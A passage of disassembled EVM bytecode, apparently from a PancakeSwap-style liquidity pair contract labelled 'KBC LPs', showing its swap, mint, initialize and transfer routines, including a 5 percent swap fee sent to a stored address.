SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x2FD PUSH2 0xC3A JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB SWAP5 DUP6 AND DUP2 MSTORE SWAP3 SWAP1 SWAP4 AND PUSH1 0x20 DUP4 ADD MSTORE PUSH4 0xFFFFFFFF AND DUP2 DUP4 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x60 ADD SWAP1 RETURN JUMPDEST PUSH2 0x359 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x343 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD AND SWAP1 PUSH1 0x20 ADD CALLDATALOAD PUSH2 0xC64 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD SWAP2 ISZERO ISZERO DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x375 PUSH2 0xC7B JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x276 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x60 DUP2 LT ISZERO PUSH2 0x3A7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 DUP2 ADD CALLDATALOAD SWAP1 SWAP2 AND SWAP1 PUSH1 0x40 ADD CALLDATALOAD PUSH2 0xC8A JUMP JUMPDEST PUSH2 0x3CF PUSH2 0xD13 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD SWAP2 DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x359 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x60 DUP2 LT ISZERO PUSH2 0x3F7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 DUP2 ADD CALLDATALOAD SWAP1 SWAP2 AND SWAP1 PUSH1 0x40 ADD CALLDATALOAD PUSH2 0xD19 JUMP JUMPDEST PUSH2 0x3CF PUSH2 0xDB3 JUMP JUMPDEST PUSH2 0x427 PUSH2 0xDD7 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH1 0xFF SWAP1 SWAP3 AND DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0x3CF PUSH2 0xDDC JUMP JUMPDEST PUSH2 0x3CF PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x45B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0xDE2 JUMP JUMPDEST PUSH2 0x3CF PUSH2 0xDF4 JUMP JUMPDEST PUSH2 0x3CF PUSH2 0xDFA JUMP JUMPDEST PUSH2 0x3CF PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x491 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0xE00 JUMP JUMPDEST PUSH2 0x3CF PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x4B7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x10FE JUMP JUMPDEST PUSH2 0x3CF PUSH2 0x1110 JUMP JUMPDEST PUSH2 0x3CF PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x4E5 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x1116 JUMP JUMPDEST PUSH2 0x51B PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x50B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x1128 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD SWAP3 DUP4 MSTORE PUSH1 0x20 DUP4 ADD SWAP2 SWAP1 SWAP2 MSTORE DUP1 MLOAD SWAP2 DUP3 SWAP1 SUB ADD SWAP1 RETURN JUMPDEST PUSH2 0x375 PUSH2 0x14CC JUMP JUMPDEST PUSH2 0x280 PUSH2 0x14DB JUMP JUMPDEST PUSH2 0x359 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x55A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD AND SWAP1 PUSH1 0x20 ADD CALLDATALOAD PUSH2 0x14FD JUMP JUMPDEST PUSH2 0x3CF PUSH2 0x150A JUMP JUMPDEST PUSH2 0x276 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x58E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x1510 JUMP JUMPDEST PUSH2 0x375 PUSH2 0x1679 JUMP JUMPDEST PUSH2 0x375 PUSH2 0x1688 JUMP JUMPDEST PUSH2 0x276 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0xE0 DUP2 LT ISZERO PUSH2 0x5C4 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 DUP2 ADD CALLDATALOAD SWAP1 SWAP2 AND SWAP1 PUSH1 0x40 DUP2 ADD CALLDATALOAD SWAP1 PUSH1 0x60 DUP2 ADD CALLDATALOAD SWAP1 PUSH1 0xFF PUSH1 0x80 DUP3 ADD CALLDATALOAD AND SWAP1 PUSH1 0xA0 DUP2 ADD CALLDATALOAD SWAP1 PUSH1 0xC0 ADD CALLDATALOAD PUSH2 0x1697 JUMP JUMPDEST PUSH2 0x3CF PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x615 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x1897 JUMP JUMPDEST PUSH2 0x3CF PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x63B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 CALLDATALOAD DUP2 AND SWAP2 PUSH1 0x20 ADD CALLDATALOAD AND PUSH2 0x1AE6 JUMP JUMPDEST PUSH2 0x3CF PUSH2 0x1B03 JUMP JUMPDEST PUSH2 0x276 PUSH2 0x1B09 JUMP JUMPDEST PUSH1 0xF SLOAD PUSH1 0x1 EQ PUSH2 0x6AC JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xF PUSH1 0x24 DUP3 ADD MSTORE PUSH15 0x14185B98D85AD94E881313D0D2D151 PUSH1 0x8A SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0xF SSTORE DUP5 ISZERO ISZERO DUP1 PUSH2 0x6BF JUMPI POP PUSH1 0x0 DUP5 GT JUMPDEST PUSH2 0x6FA JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x23 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x266D PUSH1 0x23 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 DUP1 PUSH2 0x705 PUSH2 0xC3A JUMP JUMPDEST POP SWAP2 POP SWAP2 POP DUP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND DUP8 LT DUP1 ISZERO PUSH2 0x72A JUMPI POP DUP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND DUP7 LT JUMPDEST PUSH2 0x77B JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1F PUSH1 0x24 DUP3 ADD MSTORE PUSH32 0x50616E63616B653A20494E53554646494349454E545F4C495155494449545900 PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 DUP1 DUP1 PUSH1 0x64 PUSH1 0x5 DUP12 MUL DIV DUP11 SUB SWAP1 POP PUSH1 0x0 PUSH1 0x64 PUSH1 0x5 DUP12 MUL PUSH1 0x8 SLOAD PUSH1 0x9 SLOAD SWAP3 SWAP1 SWAP2 DIV DUP13 SUB SWAP3 POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 DUP2 AND SWAP2 DUP2 AND SWAP1 DUP12 AND DUP3 EQ DUP1 ISZERO SWAP1 PUSH2 0x7D2 JUMPI POP DUP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP12 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND EQ ISZERO JUMPDEST PUSH2 0x819 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x13 PUSH1 0x24 DUP3 ADD MSTORE PUSH19 0x50616E63616B653A20494E56414C49445F544F PUSH1 0x68 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST DUP13 ISZERO PUSH2 0x82A JUMPI PUSH2 0x82A DUP3 DUP13 DUP7 PUSH2 0x1C69 JUMP JUMPDEST DUP12 ISZERO PUSH2 0x83B JUMPI PUSH2 0x83B DUP2 DUP13 DUP6 PUSH2 0x1C69 JUMP JUMPDEST DUP9 ISZERO PUSH2 0x8F6 JUMPI DUP11 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0x84800812 CALLER DUP7 DUP7 DUP15 DUP15 PUSH1 0x40 MLOAD DUP7 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP7 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 MSTORE PUSH1 0x20 ADD DUP6 DUP2 MSTORE PUSH1 0x20 ADD DUP5 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP5 DUP5 DUP3 DUP2 DUP2 MSTORE PUSH1 0x20 ADD SWAP3 POP DUP1 DUP3 DUP5 CALLDATACOPY PUSH1 0x0 DUP2 DUP5 ADD MSTORE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND SWAP1 POP DUP1 DUP4 ADD SWAP3 POP POP POP SWAP7 POP POP POP POP POP POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x8DD JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x8F1 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMPDEST PUSH1 0x64 PUSH1 0x5 DUP15 DUP2 MUL DUP3 SWAP1 DIV SWAP2 SWAP1 DUP15 MUL DIV DUP15 ISZERO PUSH2 0x923 JUMPI PUSH1 0x6 SLOAD PUSH2 0x923 SWAP1 DUP6 SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP5 PUSH2 0x1C69 JUMP JUMPDEST DUP14 ISZERO PUSH2 0x941 JUMPI PUSH1 0x6 SLOAD PUSH2 0x941 SWAP1 DUP5 SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP4 PUSH2 0x1C69 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP7 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x987 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x99B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x9B1 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP2 SWAP10 POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x9FD JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xA11 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0xA27 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD SWAP7 POP PUSH1 0x0 SWAP6 POP POP POP POP POP POP PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP6 AND DUP11 SWAP1 SUB DUP4 GT PUSH2 0xA4E JUMPI PUSH1 0x0 PUSH2 0xA5D JUMP JUMPDEST DUP10 DUP6 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND SUB DUP4 SUB JUMPDEST SWAP1 POP PUSH1 0x0 DUP10 DUP6 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND SUB DUP4 GT PUSH2 0xA7A JUMPI PUSH1 0x0 PUSH2 0xA89 JUMP JUMPDEST DUP10 DUP6 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB AND SUB DUP4 SUB JUMPDEST SWAP1 POP PUSH1 0x0 DUP3 GT DUP1 PUSH2 0xA9A JUMPI POP PUSH1 0x0 DUP2 GT JUMPDEST PUSH2 0xAD5 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x22 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x25DD PUSH1 0x22 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0xB09 PUSH2 0xAEB DUP5 PUSH1 0x19 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST PUSH2 0xAFD DUP8 PUSH2 0x2710 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST SWAP1 PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0xB21 PUSH2 0xAEB DUP5 PUSH1 0x19 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST SWAP1 POP PUSH2 0xB53 PUSH4 0x5F5E100 PUSH2 0xB47 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP12 DUP2 AND SWAP1 DUP12 AND PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST SWAP1 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST PUSH2 0xB63 DUP4 DUP4 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST LT ISZERO PUSH2 0xBA3 JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xA PUSH1 0x24 DUP3 ADD MSTORE PUSH10 0x50616E63616B653A204B PUSH1 0xB0 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST POP POP PUSH2 0xBB1 DUP5 DUP5 DUP9 DUP9 PUSH2 0x1EB6 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD DUP4 DUP2 MSTORE PUSH1 0x20 DUP2 ADD DUP4 SWAP1 MSTORE DUP1 DUP3 ADD DUP14 SWAP1 MSTORE PUSH1 0x60 DUP2 ADD DUP13 SWAP1 MSTORE SWAP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP12 AND SWAP2 CALLER SWAP2 PUSH32 0xD78AD95FA46C994B6551D0DA85FC275FE613CE37657FB8D5E3D130840159D822 SWAP2 DUP2 SWAP1 SUB PUSH1 0x80 ADD SWAP1 LOG3 POP POP PUSH1 0x1 PUSH1 0xF SSTORE POP POP POP POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x7 DUP2 MSTORE PUSH1 0x20 ADD PUSH7 0x4B4243204C5073 PUSH1 0xC8 SHL DUP2 MSTORE POP DUP2 JUMP JUMPDEST PUSH1 0xB SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP1 DUP3 AND SWAP3 PUSH1 0x1 PUSH1 0x70 SHL DUP4 DIV SWAP1 SWAP2 AND SWAP2 PUSH1 0x1 PUSH1 0xE0 SHL SWAP1 DIV PUSH4 0xFFFFFFFF AND SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0xC71 CALLER DUP5 DUP5 PUSH2 0x2079 JUMP JUMPDEST POP PUSH1 0x1 JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x8 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 0x7 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND CALLER EQ PUSH2 0xCDE JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x12 PUSH1 0x24 DUP3 ADD MSTORE PUSH18 0x2830B731B0B5B29D102327A92124A22222A7 PUSH1 0x71 SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x8 DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP5 DUP6 AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT SWAP2 DUP3 AND OR SWAP1 SWAP2 SSTORE PUSH1 0x9 DUP1 SLOAD SWAP4 SWAP1 SWAP5 AND SWAP3 AND SWAP2 SWAP1 SWAP2 OR SWAP1 SWAP2 SSTORE PUSH1 0xA SSTORE JUMP JUMPDEST PUSH1 0x0 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP4 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 CALLER DUP5 MSTORE SWAP1 SWAP2 MSTORE DUP2 KECCAK256 SLOAD PUSH1 0x0 NOT EQ PUSH2 0xD9E JUMPI PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP5 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 CALLER DUP5 MSTORE SWAP1 SWAP2 MSTORE SWAP1 KECCAK256 SLOAD PUSH2 0xD79 SWAP1 DUP4 PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP6 AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x2 PUSH1 0x20 SWAP1 DUP2 MSTORE PUSH1 0x40 DUP1 DUP4 KECCAK256 CALLER DUP5 MSTORE SWAP1 SWAP2 MSTORE SWAP1 KECCAK256 SSTORE JUMPDEST PUSH2 0xDA9 DUP5 DUP5 DUP5 PUSH2 0x20DB JUMP JUMPDEST POP PUSH1 0x1 SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH32 0x6E71EDAE12B1B97F4D1F60370FEF10105FA2FAAE0126114A169C64845D6126C9 DUP2 JUMP JUMPDEST PUSH1 0x12 DUP2 JUMP JUMPDEST PUSH1 0x4 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x3 PUSH1 0x20 MSTORE PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD DUP2 JUMP JUMPDEST PUSH1 0xC SLOAD DUP2 JUMP JUMPDEST PUSH1 0xD SLOAD DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH1 0xF SLOAD PUSH1 0x1 EQ PUSH2 0xE4B JUMPI PUSH1 0x40 DUP1 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0xF PUSH1 0x24 DUP3 ADD MSTORE PUSH15 0x14185B98D85AD94E881313D0D2D151 PUSH1 0x8A SHL PUSH1 0x44 DUP3 ADD MSTORE SWAP1 MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x64 ADD SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0xF DUP2 SWAP1 SSTORE DUP1 PUSH2 0xE5B PUSH2 0xC3A JUMP JUMPDEST POP PUSH1 0x8 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP4 SWAP6 POP SWAP2 SWAP4 POP PUSH1 0x0 SWAP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xEAF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xEC3 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0xED9 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD PUSH1 0x9 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE SWAP1 MLOAD SWAP3 SWAP4 POP PUSH1 0x0 SWAP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP3 AND SWAP2 PUSH4 0x70A08231 SWAP2 PUSH1 0x24 DUP1 DUP3 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP1 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xF2C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0xF40 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0xF56 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP MLOAD SWAP1 POP PUSH1 0x0 PUSH2 0xF75 DUP4 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP8 AND PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0xF92 DUP4 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP8 AND PUSH4 0xFFFFFFFF PUSH2 0x1E66 AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH2 0xFA0 DUP8 DUP8 PUSH2 0x2183 JUMP JUMPDEST PUSH1 0x0 SLOAD SWAP1 SWAP2 POP DUP1 PUSH2 0xFDD JUMPI PUSH2 0xFC9 PUSH2 0x3E8 PUSH2 0xAFD PUSH2 0xFC4 DUP8 DUP8 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST PUSH2 0x22F6 JUMP JUMPDEST SWAP9 POP PUSH2 0xFD8 PUSH1 0x0 PUSH2 0x3E8 PUSH2 0x2348 JUMP JUMPDEST PUSH2 0x102C JUMP JUMPDEST PUSH2 0x1029 PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP10 AND PUSH2 0xFFA DUP7 DUP5 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST DUP2 PUSH2 0x1001 JUMPI INVALID JUMPDEST DIV PUSH1 0x1 PUSH1 0x1 PUSH1 0x70 SHL SUB DUP10 AND PUSH2 0x101C DUP7 DUP6 PUSH4 0xFFFFFFFF PUSH2 0x1E03 AND JUMP JUMPDEST DUP2 PUSH2 0x1023 JUMPI INVALID JUMPDEST DIV PUSH2 0x23CC JUMP JUMPDEST SWAP9 POP JUMPDEST PUSH1 0x0 DUP10 GT PUSH2 0x106B JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x26 DUP2 MSTORE PUSH1 0x20 